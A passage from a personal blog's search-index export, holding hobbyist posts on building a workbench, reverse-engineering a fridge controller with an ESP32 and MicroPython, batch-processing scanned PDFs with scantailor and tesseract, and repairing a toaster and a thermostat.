checked\u0026mdash;\u0026lsquo;yes, I\u0026rsquo;ve got 3,500m in stock at the moment\u0026rsquo;. Madly I decided to take the trolley out again. Very madly, as MKM deliver for free, and if you plead with them they will select vaguely straight timber for you. Instead of which I lugged this lot home:\nit was blowing a gale (alright \u0026lsquo;gusting 4\u0026rsquo;) and we had some hairy moments, but we made it. First thing was to make somewhere to store tools:\nOSB is horrible stuff, but it\u0026rsquo;s cheap and takes nails well. I do not actually remember where this board came from, but I think it was dragged horribly back on a trolley like everything else. Then it was a matter of squaring up some stock and making the cross pieces.\nPared to fit precisely, dry assembled, scored and cut; and then glued and nailed:\nThe top cross piece had, I think, to be ripped to 6\u0026quot; from an 8\u0026quot; plank, which is rather hard work, particularly without a proper bench or the a decent ripsaw. But with the £5 construction site saw we got there. There are two runners on top of the legs:\nall glued together it\u0026rsquo;s a substantial frame:\nThen the long side aprons could be planed square and flat (where the joints will be, and for the vice, but left rough elsewhere), the slots cut and the whole thing trial assembled:\nAnd then, of course, planed flat all over. I was using small wedges to keep the whole thing flat (by eye) on the patio, and the apron is merely push fitted.\nAt this point the bench is a useable (and very heavy) table:\nThe next day, the same thing can be repeated, and the whole thing planed flat by eye:\nAnd the next day, the cross pieces which try to stop the whole thing bouncing around:\nAnd here it is, in situ, with the top unfinished:\nMotivational Training I have no photos of the rest of the construction until (most of) the top was on. The reason for this is that at the time I was trying to get married. This was made difficult by the sudden discovery that the plague was causing an epidemic of bigamous marriages (or something of the kind), to counter which it was necessary to close down all the registry offices whilst insisting on giving a month\u0026rsquo;s notice before getting married. For good measure they closed the churches as well, so even if one had given notice there was nowhere actually to get married.\nThe reasoning was very simple, and very logical. In normal times a notice is pinned up to a board in a building nobody every goes near, and this qualifies as informing the community of impending nuptials in order that any trifling objections (but she\u0026rsquo;s still married to me!) can be sorted out before the \u0026lsquo;I object\u0026rsquo; (which is of course only found in the Prayer Book service anyhow: Catholics are not allowed to object). Since the Plague was causing such a spate of such marriages, a compromise position was eventually reached: notices could be given and pinned up in a building, but nobody was allowed actually to enter the building in question, for fear of contracting a bigamous marriage in the process.\nThis solution, which was reached by a great art of bureaucratic endeavour, owed nothing to the mornings spent pleading, arguing, insisting and generally bothering the notary local. Indeed Providence simply arranged things; such that after a particularly long and insistent conversation I was assured that nothing would be possible for at least a month; and that afternoon they rang to arrange an appointment. But after such mornings one was in such a temper the only thing to do was to go and plane great amounts off the great planks until everything was square. But I was in no mood for photographs, and there are none, until the bench was put to use building wedding furniture in the mad week before the thing itself. But that\u0026rsquo;s another post.\n","permalink":"https://2e0byo.github.io/post/carpentry/workbench2/","tags":["Lockdown"],"title":"Carpentry Workbench"},{"categories":["Engineering"],"contents":"OpenFridge has been running the fridge since the first post, which apparently was in January. In that time:\nThe fridge has been very cold (in fact so cold I increased the setpoint to 5 degrees and moved the sensor to the bottom) The freezer has been cold, as desired The controller reboots pretty frequently The controller sometimes loses the network connection and can\u0026rsquo;t allocate enough ram to recover it The controller occasionally latches up entirely, even with the software watchdog enabled, and refuses to respond to serial commands. I speculate that this latter is caused either by 1. brown out/noise/bouncing from switching a relay (it almost always happens after switching the compressor off) or 2. noise on the lines causing the ESP32 to enter step/run debugging mode. I \u0026lsquo;fixed\u0026rsquo; it by a. adding a 555-based hardware WDT and b. moving the relay board ground line to separate the grounds. Unfortunately, the RESET_CAUSE property is not very reliable (reproducible) so I can\u0026rsquo;t really get any metrics on how often this is triggering.\nThe ram allocation problem needs looking into. However, losing wifi isn\u0026rsquo;t the end of the world, and the uPy core carries on running just fine.\nEventually a new problem occurred:\nThe fridge was far too cold. The cooler temperature readings made no sense. I suspected the freezer had become iced up, and indeed, taking it apart showed frosting comparable to the state at the very beginning. I thus hacked the controller to add a manual mode and ran the heaters. After running them all day and with a DS18B20 replacing the broken cooler thermistor the temperature climbed as high as 1 degree. This lead to the following (very obvious) realisation:\nEnd of defrost can be detected by a sharp rise above zero on the cooler.\nThe reason, of course, is that as long as there is ice at the cooler it melts and tries to maintain\u0026hellip; 0 degrees (duh). So defrosting = heat cooler till it goes above, say, 5. And that, clearly, for a much longer period than I was doing before.\nOther than this tweak, several more have been added:\nOpenFridge now outputs csv readings on the kitchen/fridge/log channel, which can be read by Serial Studio. This gives you a nice pretty dashboard for free. All sensors are now DS18B20s, and I bought some \u0026lsquo;waterproof\u0026rsquo; (clones) off Ebay and wired it up properly. The Dashboard showed that invalid readings were occurring periodically, causing me to dig into the code: there was a race condition between the control loop and the log loop, both of which read the sensors. This is why we use a separate sensor-polling loop\u0026hellip; There is now a REST-full (hopefully) web API using picoweb. At some point I might build a dashboard in e.g. vue.js. Command/Control over MQTT is deprecated. Further work to be done:\nFix the RAM allocation problem. (pre-compiling will likely sort it) Log properly over a long period to see how stable the firmware is. Secure the web API (\u0026amp; remove command over MQTT) Store some kind of history in ram on the device (using a preallocated buffer) so we can print a basic graph on demand. However, hopefully, OpenFridge is now reasonably stable.\n","permalink":"https://2e0byo.github.io/post/engineering/reverse-engineering-fridge3/","tags":null,"title":"Reverse Engineering a Fridge: Part 3"},{"categories":["Engineering"],"contents":"Hardware So we have five mains circuits: the lamp, the fan, the heaters, the compressor, and the \u0026lsquo;superfreeze\u0026rsquo; button, which I think just adds the starting coils permanently. The original controller only switches four of these on the board (the superfreeze is a manual switch), and uses triacs for all except the compressor, which has a 10A relay. Of course, that requires the controller to be attached to the AC neutral, which isn\u0026rsquo;t a great idea with exposed hardware like a prototype balanced on a fridge. So we\u0026rsquo;ll use relays for everything: three low-current relays, and two great big 15A monsters, all from the microwave control board.\nI wired these all up on protoboard, with back-emf diodes and BC547s as switches. To save current they are switched with a resistor bypassed by a capacitor: on connection the capacitor dumps full current on the relay, but then charges up and effectively disappears, so changing the resistor value allows us to set a lower holding current. These were picked by feel: 10k for the little relays, which seem fine with that (remember we\u0026rsquo;re talking 24v!). One little relay is most over-used and needed the resistor shorting out, and even then he did not make a happy clicking sound like his friends. I think he may be growing old, but we\u0026rsquo;ll use SSR in the final thing anyhow.\nHere is the relay board:\nAnd here\u0026rsquo;s the rest of the hardware:\nThe rest of the hardware was fairly straightforward. An ESP32, on a generic Chinese dev board, drives the relays. There are at present three DS18B20 temperature sensors: two to calibrate the thermistors, but I plan on removing them, and one to measure the room temperature, since it might be interesting to know what difference very cold or hot days make. The thermistors are in a potential divider connected to the ESP32\u0026rsquo;s famously bad ADC. A 100nF capacitor partly mitigates the ADC; we don\u0026rsquo;t need much resolution for this so we only read at 9-bits, and it\u0026rsquo;s pretty much useable.\nFirmware The ESP32 is running MicroPython, which is brilliant. Development is measured in minutes, not hours, and compiling is unneeded, plus I can actually read the final code. Of course all this comes at a price in terms of speed and current draw, but neither matter much here. We can also use asyncio, which saves having to think about the loop.\nI first wrote a basic hal (hal.py) to turn things on and off. The light is handled directly in the hal, as a callback to Peter Hinch\u0026rsquo;s excellent async switch code.\nWith that the the fridge could be remote controlled over wifi using webrepl, which is an amusing gimmick but not much use. So we use MQTT and have it respond to commands sent to kitchen/fridge/CommandControl. Simultaneously all the temperatures are logged every five seconds over MQTT.\nNow it was just a matter of picking resistor values to get a decent range on the ADC, which took a bit of trial and error, and then calibrating the thermistors against the DS18B20s. I cable-tied one to the thermistor attached to the heat exchange and ran some experiments. I\u0026rsquo;m not sure how hot you\u0026rsquo;re supposed to take the exchange, but 30 degrees seemed reasonable. Just as well, as the thermistor hits 0 at about that value.\nHere is a graph of my first run, showing 511-thermistor value against time and temperature against time:\nHmm. That\u0026rsquo;s not very linear. Here\u0026rsquo;s the calibration curve:\nI can certainly make a table of interpolations out of this, but it\u0026rsquo;s going to be big. Let\u0026rsquo;s try again:\nWhich has very different raw values. Here they are on top of each other:\nMaybe the problem is thermal lag, even though the calibrating sensor is attached to the thermistor? In the last test I used the compressor (with \u0026lsquo;deep freeze\u0026rsquo;) to lower the temperature, and then the fan to warm it up (with the compressor off), and then the heater. I did the same for this test, but rather than switching to heaters at -4 I went all the way up to zero. I also left the fan on to slow the heating effect, and opened the freezer door so as not to heat up the enclosure. (I turned the fan off at 15 degrees, as I was getting impatient.)\nHow good does it need to be? Not necessarily very good, though that would be nice. I don\u0026rsquo;t mind leaving the sensors in permanently if need be.\nAfter a bit of thought, I aggregated all the data, did a polynomia1l fit with numpy, excluded everything too far from the fit, did another fit on the resultant data, and generated a 3rd-order polynomial which fit the reduced data nicely:\nThe only trouble is that this is backwards. We want to go from sensor reading to temperature. The coefficients were horrendous, and the rearrangement (courtesy of Wolfram Alpha) was horrible, so I did the fit backwards. It needed a 6th-order polynomial to fit, but when I did a fit on the previous fit I got something which lay neatly\u0026mdash;enough\u0026mdash;on top of the data:\nThe only problem is that we have to solve a 6th-order polynomial on an MCU. Given that there are only 512 possibly values, a lookup table might be better, but then this MCU runs at 160MHz and doesn\u0026rsquo;t seem to care. Of course there\u0026rsquo;s no numpy for MicroPython (at least, not for doing curve fitting) so we compute the output manually:\ndef eval_poly(x, coeffs): \u0026#34;\u0026#34;\u0026#34; Evalulate polynomial. Coeffs should be passed little-endian, ie coeffs[0] = x^0. \u0026#34;\u0026#34;\u0026#34; y = 0 for i, coeff in enumerate(coeffs): y += coeff * x ** i return y In Cpython that returns slightly different values from numpy. Presumably numpy implements this stuff in c.\nWhen I have enough data I shall do the same for the fridge thermistor. For now I only have laggy noise:\nThese thermistors are very non-linear! On the other hand, it seems like they picked a thermistor which would work well at freezing temperatures, which makes sense.\nDiscoveries The compressor has a manual timeout after it is switched off, preventing you from turning it on again for around 5 minutes. (Possibly temperature based?) Control logic We control the fridge and freezer separately. If the fridge is too warm, we turn the compressor on. If it is too cold, we turn the compressor off. If the freezer is too cold, we do nothing (as it doesn\u0026rsquo;t much matter anyhow). But we could turn the heaters and fan on. But if it is too warm, we turn the fan + compressor on.\nEvery time we turn the compressor off we start a ten minute timer which disables it until it elapses, to save wear and tear, just in case the starter relay doesn\u0026rsquo;t do so.\nEvery twelve hours we defrost, by running for five minutes or until the cooler reaches 10 degrees. Additionally, if the freezer temperature fails to fall by 2 degrees in fifteen minutes (this might need adjusting), we guess that it needs defrosting and run a panic defrost, stopping the current cooling cycle. If it fails to fall by one degree in eight minutes, we turn on the deep freeze. Hopefully this logic would sooner or later catch an ice build up, but we can always review it later\u0026mdash;or indeed, command a manual defrost over mqtt.\nThe fridge temperature is taken from the fridge thermistor. The freezer temperature is taken from a DS18B20 on a bit of flat cable, stuffed in a drawer. The cooler temperature is taken from the attached thermistor. (I suspect they guessed the fridge temperature by running the fan for a bit and then sampling the cooler. This would fail if the thing were awfully iced up, as it was this time.) The room temperature is taken from another DS18B20 on top of the fridge. Whilst I plan to box up the controller and redeem the power supply (currently it\u0026rsquo;s running from a dual lm317 supply I built as a child), I\u0026rsquo;ll leave it separate and on top\u0026mdash;that way it\u0026rsquo;s easier to get at.\nEverything can be remotely controlled, and everything is logged to kitchen/fridge/log and kitchen/fridge/temperature so I should be able to get some data on efficiency and hopefully tune it.\nLimitiations At present the DS18B20s sometimes fail to convert (gives 85). I\u0026rsquo;ve reduced the frequency by trying repeatedly, but give up after 3 attempts (might need to wait longer). The graphing code just ignores any 85s. I suspect the onboard 3.3v regulator is struggling to output enough current to power the thing parasitically. Additionally, I need to check that DQ is properly pulled high in the waiting time: if it isn\u0026rsquo;t, then all the current is coming via the 1k pull up, which is likely not enough. The driver ought to put the pin in output mode and drive it high for the duration, but without a datalogger on it/examining the source code there\u0026rsquo;s no way to tell.\nFurther developments I should like to add a buzzer, so we can warn if the door is left open or the device goes out of temperature range. I\u0026rsquo;m also not quite sure what happens at the moment if the wifi goes down: I suspect the controller will be fine, but I need to test it (the risk is more a buggy connection which never gets established). And, of course, it should be in a proper box so nobody goes a-gefingerpoken, which could be interesting as nearly everything is at mains potential.\nAnd, most importantly, we just need to get a lot more data so we can characterise it a bit better.\n{\u0026#34;msg\u0026#34;: \u0026#34;start cooling\u0026#34;, \u0026#34;msg_id\u0026#34;: 11, \u0026#34;timestamp\u0026#34;: \u0026#34;2021-1-22 19:43:11\u0026#34;} //response to status query {\u0026#34;msg\u0026#34;: \u0026#34;{\u0026#39;heaters\u0026#39;: False, \u0026#39;fan\u0026#39;: False, \u0026#39;deep_freeze\u0026#39;: False, \u0026#39;compressor\u0026#39;: False, \u0026#39;light\u0026#39;: False}\u0026#34;, \u0026#34;msg_id\u0026#34;: 17, \u0026#34;timestamp\u0026#34;: \u0026#34;2021-1-22 19:43:33\u0026#34;} {\u0026#34;msg\u0026#34;: \u0026#34;Turning compressor on\u0026#34;, \u0026#34;msg_id\u0026#34;: 57, \u0026#34;timestamp\u0026#34;: \u0026#34;2021-1-22 19:47:34\u0026#34;} {\u0026#34;msg\u0026#34;: \u0026#34;Turning compressor and fan on\u0026#34;, \u0026#34;msg_id\u0026#34;: 58, \u0026#34;timestamp\u0026#34;: \u0026#34;2021-1-22 19:47:34\u0026#34;} //response to status query {\u0026#34;msg\u0026#34;: \u0026#34;{\u0026#39;heaters\u0026#39;: False, \u0026#39;fan\u0026#39;: True, \u0026#39;deep_freeze\u0026#39;: False, \u0026#39;compressor\u0026#39;: True, \u0026#39;light\u0026#39;: False}\u0026#34;, \u0026#34;msg_id\u0026#34;: 74, \u0026#34;timestamp\u0026#34;: \u0026#34;2021-1-22 19:49:3\u0026#34;} {\u0026#34;msg\u0026#34;: \u0026#34;Deep freezing as freezing slowly\u0026#34;, \u0026#34;msg_id\u0026#34;: 88, \u0026#34;timestamp\u0026#34;: \u0026#34;2021-1-22 19:50:27\u0026#34;} //response to status query {\u0026#34;msg\u0026#34;: \u0026#34;{\u0026#39;heaters\u0026#39;: False, \u0026#39;fan\u0026#39;: True, \u0026#39;deep_freeze\u0026#39;: True, \u0026#39;compressor\u0026#39;: True, \u0026#39;light\u0026#39;: False}\u0026#34;, \u0026#34;msg_id\u0026#34;: 202, \u0026#34;timestamp\u0026#34;: \u0026#34;2021-1-22 20:2:2\u0026#34;} Eventually, I got round to having another look at the controller. See part three: fixing the defrost.\nObviously, this is a logarithmic (reverse-log) rather than polynomial fn. But I was a bit daft the day I did this, and my day-job is in theology, not maths. As it happened I dropped the thermistors entirely in the end.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://2e0byo.github.io/post/engineering/reverse-engineering-fridge2/","tags":null,"title":"Reverse Engineering a Fridge: Part 2"},{"categories":["Engineering"],"contents":"We have a Hotpoint FFA52 fridge-freezer. It has previously given much hardship. It no longer works. Here is a graph of a non-working freezer:\nI don\u0026rsquo;t mind a bit of swing in the temperature, but that\u0026rsquo;s all over the place. In the meantime the fridge compartment turned into a freezer, albeit not a very good one. Time to take it apart and see what the problem could be.\nCooling System This fridge-freezer has one fan, two thermistors (one in each compartment), one heat exchange (at the top of the freezer compartment), a duct around the heat exchange/fan which causes air to be drawn from the bottom of the freezer compartment and blown out at the top, recirculating via the door, a \u0026lsquo;superfreeze\u0026rsquo; button which causes it get colder quicker (or possibly just colder) and is to be used \u0026lsquo;when the ambient temperature is below 16 degrees or you want to freeze fresh food\u0026rsquo; and should be used \u0026lsquo;only for 24 hours, but always if the ambient temperature is below 16 degrees\u0026rsquo;, a light (in the fridge compartment), a door switch (in the fridge compartment), an uncalibrated knob to set the fridge temperature, and a power indicator, which never comes on. Attached to heat exchange is a defrosting coil and a thermal fuse, and another defrosting coil is in the polystyrene insulation directly below the heat exchange and in the duct.\nFor pictures of all this, see the previous post.\nThere is a control board at the very top of the freezer, in the same plastic membrane which supports the top door hinge. Every design decision here seems to be about cutting cost (why no third metal hinge?) and the plastic had become brittle, but despite snapping the clips taking it off the two screws seem to hold the door rigidly enough.\nI removed the top membrane, cut notches in it where the two bundles of wires come out to meet the control board, removed (at the cost of a screwdrive gashing a fingertip) the control board from the membrane and reattached it with everything poked up on top. Now we can fiddle with the controller without having to take the fridge apart each time. Here is a poor photo of the control board:\nand here is the other side, with the microcontroller:\nAlas, that\u0026rsquo;s a manufacturer-specific partnumber and I have no idea what this is, but probably an 8-bitter (or maybe it\u0026rsquo;s just a bunch of comparitors and not an MCU at all?). There goes the dream of hooking up an STLink and flashing new firmware. Still, it\u0026rsquo;s likely not the firmware (if there is any) which has gone.\nWe\u0026rsquo;re lucky enough to have another fridge and freezer, so I decamped everything and turned it off. Then I took the ducting off. It was frozen solid and took a hairdryer to move. Once off it was clear what had happened:\nThat\u0026rsquo;s ice, all along the back, right up to where it hit the inside of the compartment. No wonder it wouldn\u0026rsquo;t come. The overflow tube is a solid icycle. The heat exchange, crucially, looks fine however:\nThe coil in the foreground is the heater, the wire is to the thermistor and the the thermal fuse is on the other side.\nTesting What had gone wrong? My first guess was that either the fan had failed or one or both of the heating coils. The heat exchange wasn\u0026rsquo;t frozen solid and the heater attached to it measured only a few ohms, so it wasn\u0026rsquo;t that. The other heater was rather less inspiring at 6k, but 6k is not an open circuit and looked plausible. I thus took it upstairs, put it on a towel, and rigged up an experiment:\nThe multimeter is a Vichy VC99 with optoisolated serial output added to it, but multimeter hacking is for another post. Mains arrives by the black wire.\nWell that clearly didn\u0026rsquo;t work, but I briefly saw 150mA being drawn. Perhaps it\u0026rsquo;s the connection? With some 2.5mm^2 wire bent and pushed in it started going:\nWhich is actually a test of the fan, as you can see. The fan works; the heater works too:\nApologies for the screenshot. SmuView\u0026rsquo;s saving is currently broken and I haven\u0026rsquo;t had time to look at it.\nFan draws less than 50mA with a noticeable startup spike (probably higher as the multimeter only samples every 0.6s), heater draws 150mA.\nSo that can\u0026rsquo;t be it. Why, then, were they not getting switched on? I had another look at the controller board. It has a large 100nF capacitor, presumably as a capacitative power supply. It has a 12v relay, a lot of transistors, SCRs (or mosfets? But would have to be two/output if so, so unlikely), some high-power resistors (second power supply for the logic?) and handfull of passives, most notably varistors. What could go? The relay is for the compressor (highest current load). So the rest are on SCRs, which can go; or perhaps its a transistor somewhere?\nAs it happens, I\u0026rsquo;ve always wanted to build a fridge controller. So let\u0026rsquo;s just reverse-engineer the connections and start from scratch.\nReverse Engineering Fridge Operation There is no air-channel from the freezer to the fridge. So the usual blow-air-from-freezer block-channel approach can\u0026rsquo;t be in use. What else could it be? I was stumped for ages until I realised the insulation under the heat exchange is partly to insulate the freezer from the heat exchange. So the fridge is called by direct contact with the heat exchange + convection. Colder fridge = run compressor for longer. That explains why turning the fridge temperature to the lowest setting did cool the freezer, but froze the fridge.\nFreezer Operation How does the freezer cool, then? I was stumped a bit further, and wondered if they were doing something horrible like using a heater to stop it getting too cold (\u0026lsquo;icebox in fridge\u0026rsquo; fridges actually do this). Then I realised that the freezer will basically not cool if the fan doesn\u0026rsquo;t run, or if the airway is blocked. So run the fan = cool the freezer. The aggressive defrosting is to prevent exactly what has been happening.\nHow long do we defrost for? This will require some experimentation, but the presence of a thermal fuse suggests a reasonable time (unless it\u0026rsquo;s just a statutory requirement). The thermistor on the heat exchange should give us useful data on that.\nWiring This was rather time-consuming and is specific to this fridge, but I eventually found I have two thermistors, one in each compartment, with a room-temperature resistance of around 20k and a negative temperature coefficient (tested with a hairdryer). Then there\u0026rsquo;s a connection for the lamp, power, connection to the heaters (which are in parallel, with a thermal fuse in series on each leg), the motor, the door switch, and separate switch for the \u0026lsquo;quick freeze\u0026rsquo; option, which is wired directly to a tap on the compressor motor and probably just makes the compressor run faster. So to control everything we need to switch:\nthe compressor (10A on their relay) the \u0026lsquo;go fast\u0026rsquo; (10A to be safe) the light the fan the heaters and recieve input from:\nthe door (digital) the fridge thermistor (analogue) the freezer thermistor (analogue) That\u0026rsquo;s 5 relays or SCRs (but I have no SCRs). Fortunately I have an old microwave controller with relays galore:\nThese are 24V relays, but 5*5 = 25, which is close enough, and a 5x voltage multiplier is easy enough. Switching current on the large relays is 50mA however, but with a soft-hold we can save current (so long as we don\u0026rsquo;t switch too many at once).\nTime for part two: writing a fridge controller.\n","permalink":"https://2e0byo.github.io/post/engineering/reverse-engineering-fridge/","tags":null,"title":"Reverse Engineering a Fridge"},{"categories":["Coding"],"contents":" This post is largely a log so I remember how to do it next time, but if anyone else has a bunch of scans to convert, read on\u0026hellip;\nBackground Frequently in academia\u0026mdash;and probably in much of the modern world\u0026mdash;one has to handle things which began life as books, hit the glass of a scanner, and became pdfs. Scanning is hard, and unless one has a lot of patience, the resulting pdfs are generally pretty all over the place: sometimes pages are upside down, frequently the book (which was not made to lie flat) does not want to flatten on the glass, and often the scanner has simply picked a nearby standard page size.\nUnfortunately nobody seems to have one of these.\n(That\u0026rsquo;s a linear book scanner by the way. Some day\u0026hellip;)\nFortunately converting scans to decent images isn’t that hard with scantailor. Most of the processing can be done automagically, but one can keep an eye on it and correct the inevetable odd slip. (Again and again I’ve tried to write fully automated scan converters, but it just doesn’t work.)\nWhat was missing\u0026mdash;up to now\u0026mdash;was some way of automating the process of taking a pdf, splitting it up into individual images, dumping those images in a sensible directory, running scantailor on that directory, and then, when it was all done, converting back to pdf, running ocr on the pdfs and then zipping them all back together into a single, processed pdf (and ideally putting it somewhere sensible). All of this can be done, quite easily, with a mix of find, parallel, imagemagick and tesseract but I don’t do it often enough to remember the comands.\nAutomating it A few days ago I encountered cookiecutter which makes pre-populating directories very easy: even easier than just putting a bunch of mkdirs in a script: so easy I actually use it. I also had occasion to convert a bunch of scanned pdfs into processed files. Ideally one should be able to drop all the pdfs in a dir and run some script on it which will set everything up for scantailor: come back with a cup of tea and work through the scantailor projects, and then run some other script and leave the computer OCRing overnight, to wake up to a neat bunch of pdfs in some easy-to-find directory. So I decided to write the scripts and put them up somewhere.\nFirst off was a cookiecutter template to make the right dirs, which spits out something looking like this:\nproject_name / src / tmp / final / templates / minimal_template.ScanTailor / prepare.py / finish.py The key to this is the minimal ScanTailor template. It seems ScanTailor will accept a very minimal template indeed:\n\u0026lt;project layoutDirection=\u0026#34;LTR\u0026#34; outputDirectory=\u0026#34;{{ outdir }}\u0026#34; version=\u0026#34;3\u0026#34;\u0026gt; \u0026lt;directories\u0026gt; \u0026lt;directory id=\u0026#34;1\u0026#34; path=\u0026#34;{{ outdir|replace(\u0026#39;/final\u0026#39;, \u0026#39;/source/tmp\u0026#39;) }}\u0026#34;/\u0026gt; \u0026lt;/directories\u0026gt; \u0026lt;files\u0026gt; {% for inf in input_filenames %} \u0026lt;file name=\u0026#34;{{inf.name}}\u0026#34; id=\u0026#34;{{inf.id}}\u0026#34; dirId=\u0026#34;1\u0026#34;/\u0026gt; {% endfor %} \u0026lt;/files\u0026gt; \u0026lt;images\u0026gt; {% for inf in input_filenames %} \u0026lt;image fileId=\u0026#34;{{inf.id}}\u0026#34; subPages=\u0026#34;2\u0026#34; id=\u0026#34;{{inf.id + 1}}\u0026#34; fileImage=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;dpi horizontal=\u0026#34;600\u0026#34; vertical=\u0026#34;600\u0026#34;/\u0026gt; \u0026lt;/image\u0026gt; {% endfor %} \u0026lt;/images\u0026gt; \u0026lt;/project\u0026gt; That’s a jinja2 template, but you can easily see the xml in it. It generates a valid, but bad looking project whose thumbnails are all off, but once we run ‘split pages’ it all gets sorted out.\nWe generate this in prepare.py, once we’ve split the original pdf (using pdftk burst) and then generated an image for each page\u0026mdash;ideally just taking the output with pdfimages, but if that doesn’t work (some ‘clever’ scanning packages actually output multiple layers) then we just pass it through convert i.e. ImageMagick, with -density=300.\nParallelism is done with gnu parallel: indeed, the python scripts mainly just call run(cmd, shell=True) so you definitely should not run this willy-nilly. But it’s no worse than the shell script you otherwise would use (and I used before).\nThese scripts are customised by cookiecutter when they are made, which is neat. So we can just put:\ncmd = \u0026#34;pdftk *-ocr.pdf output {{cookiecutter.directory_name}}.pdf\u0026#34; and the resulting script will contain the right filename. Of course, we could have worked it out from within the script, but this is neater.\nA few other things to note with this kind of work:\ntesseract will try to parallel, so you have to call it as env OMP_THREAD_LIMIT=1 tesseract \u0026lt;args\u0026gt;. Generally speaking it’s better to single-thread and run multiple instances in parallel when doing this kind of work. If it runs out of ram, editing the script and putting -j $(echo $(nproc)-2 | bc) (without the $s if you, like me, run fish), will generally calm things down. Or make more swap space temporarily i.e. a swapfile. We use a local tmpdir for parallel, as /tmp here is a ramdisk. Now, how do you batch process everything? In the root of the repository is a script\nauto_process_pdfs.py [-h] [--outdir OUTDIR] [--finish] [--process] INDIR which expects to be run from a dir containing pdfs to process. It will call cookiecutter for each pdf, using the slugified (i.e. like-this) form of the filename to name the repository (you need python-slugify). Then it will drop the relevant pdf into /source of the target dir and run prepare.py.\nAfter that you can run the script again, but with --process and it will call scantailor for every file.\nWhen everything is done, you can call the script again, this time with --finish, and walk away. If everything goes well you should find a bunch of symlinks in the output directory, ready to call cd OUTDIR; zip -r ../archive .. By default zip dereferences symbolic links, so you get a bunch of pdfs in a zip file, which poor users of the Windoze (almost)Operating System can probably handle.\nStatistics I’ve not timed the pre- and post-processing as they relate to the particular computer in use and not much else. But how long does it take to process scans in scantailor this way?\nWith 8 pdfs totalling 120 pages (some doubles), of which three needed serious dewarping, it took me 36 minutes to produce 183 pages of output. That works out at 36*60/183 = 11.8 seconds a page. Not bad, eh?\nAdd to that however long it takes you to get all the pdfs in one directory (which would need doing anyhow), and thirty seconds\u0026mdash;I\u0026rsquo;m being generous\u0026mdash;to run the script and walk away. Then think how long it would take to make all the dirs and populate them by hand\u0026hellip;\nMost of that is down to scantailor-advanced, whose automatic defaults are extremely good.\n","permalink":"https://2e0byo.github.io/post/coding/cleaning-scanned-pdfs/","tags":null,"title":"Cleaning Scanned Pdfs"},{"categories":["Repairs"],"contents":"Somebody has bent the toaster. It shouldn’t be looking like this:\nIt should be looking rather like this:\nOh well. It\u0026rsquo;s only mild steel and it bends easily. Some springs got out of place too, but it\u0026rsquo;s easy enough to ping them all back, particularly with the unbent side for comparison. The hard thing is normally taking toasters apart\u0026mdash;cheapy ones are frequently held together with bent metal tabs, which sheer if you try to unbend them\u0026mdash;and of course it\u0026rsquo;s always messy. But this is a quality toaster. I got it half price, but if a tree fell on it tomorrow I would go out and buy the same model. It has the deepest slots of any toaster in the local Tescos (and the local Tescos had many toasters). I know. I measured them all. (Back then nobody bothered you in shops. Now of course they\u0026rsquo;d probably arrest me for touching the merchandise and spreading the coronavirus.) And I was going to award Russel Hobbs full marks for making something with no hidden screws and only standard heads, until lo and behold! there was one hidden screw with a star head. Well I have screwdrivers a lot more exotic than star heads, but that\u0026rsquo;s one black mark against Russel Hobbs. So the toaster only scores 19/20.\nAside\u0026mdash;Why, oh why, do they do this? Everything abounds with hidden \u0026lsquo;safety\u0026rsquo; screws, weird screw heads, nonstandard threads, inverted genders\u0026mdash;why do you think WiFi equipment doesn\u0026rsquo;t use an SMA plug? Because it was felt that the weird \u0026lsquo;reverse SMA\u0026rsquo; it used would discourage users from plugging in antennas with too high a gain and polluting the spectrum\u0026mdash;so they say. But how does this reasoning hold up? Reverse SMA connectors had to be manufactured, so of course one can buy a dozen reverse-SMA-to-SMA adaptors, and any number of aftermarket wifi antennas with ready-fitted reverse-SMA connectors. They\u0026rsquo;re no better than the antennas without\u0026mdash;I\u0026rsquo;ve seen 24db advertised, and that will cause a lot of interference if it\u0026rsquo;s not very carefully sited in a remote area\u0026mdash;they\u0026rsquo;re just more expensive. Did some nutcase bureaucrat decide that if we couldn\u0026rsquo;t take our toasters apart, we wouldn\u0026rsquo;t die of electrocution? And how many die of electrocution from taking their toasters apart? If it\u0026rsquo;s more than one a year, I fear we should keep it quiet\u0026mdash;in the current climate they might just lock the country down until they can find a truly unopenable toaster\u0026hellip;\nBut anyhow, it was very easy to bend everything back. But while we\u0026rsquo;ve got this open, what\u0026rsquo;s inside? I was impressed to see two distinct control boards, each of which controls three wires running to elements in the toasting grid (?! Perhaps for level control? Although it uses a triac so it could just dim them. Or are they perhaps in parallel\u0026mdash;but in that case, why not just wire them together?). There\u0026rsquo;s what is evidently some kind of thermistor, probably for the defrost and reheat cycles, which is nice to see. Though I do notice that this toaster is fairly reliable from cold and from hot, which suggests it might be applying something cleverer than a timer. Here are all the innards from one side:\nand here is the MPU:\nUnfortunately, beyond that it\u0026rsquo;s an MPU, I couldn\u0026rsquo;t find anything out about this chip. It appears to be something home-grown for the Chinese market, and the only references I could find were marketing references largely in Chinese. But it\u0026rsquo;s definitely an MPU, and quite a modern one at that. So there are now two computers in a toaster. How times do change.\n","permalink":"https://2e0byo.github.io/post/repairs/toaster/","tags":null,"title":"Toaster"},{"categories":["Repairs"],"contents":"Our thermostat has an annoying feature. If you press any button\u0026mdash;but particularly the ‘OK’ button you have to press a lot to change anything\u0026mdash;it reboots. Worse, it loses everything you’ve just entered. Last night it started doing this without my pressing anything. I first thought a dead battery might be to blame, but even with a steady 3V from my bench power supply it refused to work. I put it aside, and when it came back on ten minutes later, very carefully increased the temperature till it turned on. Here is a dud thermostat:\nIt looked a nightmare to take apart, but in fact they have helpfully told you where to lever it open:\nand indeed it does just pop open, revealing a single board with everything soldered in place, and two battery clips:\n\u0026hellip;except the two battery clips, which are a push-contact, and have corroded:\nSomething about these clips was niggling, but I turned the soldering iron on to solder a little bit of wire to each one and have no more problems. It wouldn\u0026rsquo;t take. Not with a lot of scratching, which will normally make nickel behave itself, nor with a lot of heat and preheating. Bother. Yet it was magnetic: it had to be nickel or steel. And both of those have good to moderate solderability\u0026hellip;\nWikipedia, of course, has an article on solderability. And it points out that some steels\u0026mdash;like stainless\u0026mdash;have poor solderability. That was what had been niggling: the clips are stainless steel (though they\u0026rsquo;ve corroded all the same). I have no acid flux, and whilst I could buy some tomorrow, it\u0026rsquo;s a bit much just for this job. So I cleaned both sides up thoroughly, bent them a bit and put it all back together. Whilst we\u0026rsquo;re at it, here\u0026rsquo;s a close up of the ICs used (the other side of the board is just the lcd, capacitance switches, and tracks):\nIt\u0026#39;s an 